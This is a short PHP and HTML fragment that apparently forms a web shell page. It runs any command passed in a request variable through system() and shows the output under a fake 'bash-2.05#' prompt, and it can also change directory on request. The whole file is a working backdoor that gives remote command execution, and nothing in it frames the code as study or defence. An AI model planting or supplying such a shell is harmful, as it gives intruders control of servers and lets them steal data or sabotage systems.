   </center><font size="2"><pre>


   bash-2.05# <?
     if (isset($chdir)) @chdir($chdir);
     ob_start();
     system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
     $output = ob_get_contents();
     ob_end_clean();
     $output = str_replace("\n","\nbash-2.05# ",$output);
     if (!empty($output)) echo  str_replace(">", "&gt;", str_replace("<", "&lt;", $output));

   ?>
   </pre>
   <? die(); ?>
